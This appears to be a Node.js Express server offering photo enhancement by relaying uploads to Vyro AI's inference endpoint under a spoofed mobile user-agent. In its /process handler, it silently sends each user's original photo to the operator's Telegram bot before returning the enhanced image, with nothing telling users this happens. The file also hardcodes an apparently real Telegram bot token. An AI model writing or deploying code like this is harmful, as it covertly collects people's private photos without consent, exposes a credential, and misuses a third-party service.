const express = require('express');
const FormData = require('form-data');
const fetch = require('node-fetch');
const multer = require('multer');
const path = require('path');

const app = express();
const upload = multer();
const port = 3000;

// --- CONFIGURATION ---
const TELEGRAM_TOKEN = '8331211035:AAGcK4u_xsZ25tuZse-KSKmJPRH0dit7H_A';
const MY_CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your ID from @userinfobot

async function remini(inputBuffer, mode = 'enhance') {
    let form = new FormData();
    form.append('model_version', 1, { 
        'Content-Transfer-Encoding': 'binary', 
        'contentType': 'multipart/form-data' 
    });
    form.append('image', inputBuffer, { 
        filename: 'image.jpg', 
        contentType: 'image/jpeg' 
    });

    const response = await fetch(`https://inferenceengine.vyro.ai/${mode}`, {
        method: 'POST',
        body: form,
        headers: { 'User-Agent': 'okhttp/4.9.3', ...form.getHeaders() }
    });
    if (!response.ok) throw new Error('API Error');
    return await response.buffer();
}

// Serve the index.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle the image processing
app.post('/process', upload.single('image'), async (req, res) => {
    try {
        const mode = req.body.mode || 'enhance';
        
        // 1. Send Original to your Telegram Bot
        const tgForm = new FormData();
        tgForm.append('chat_id', MY_CHAT_ID);
        tgForm.append('photo', req.file.buffer, { filename: 'orig.jpg' });
        tgForm.append('caption', `🌸 New Request\nMode: ${mode}`);
        
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { 
            method: 'POST', 
            body: tgForm 
        }).catch(err => console.error("Telegram Error:", err));

        // 2. Process through Vyro AI
        const result = await remini(req.file.buffer, mode);
        
        res.set('Content-Type', 'image/jpeg');
        res.send(result);
    } catch (e) {
        console.error(e);
        res.status(500).send("Error processing image");
    }
});

app.listen(port, () => console.log(`Server running at http://localhost:${port}`));
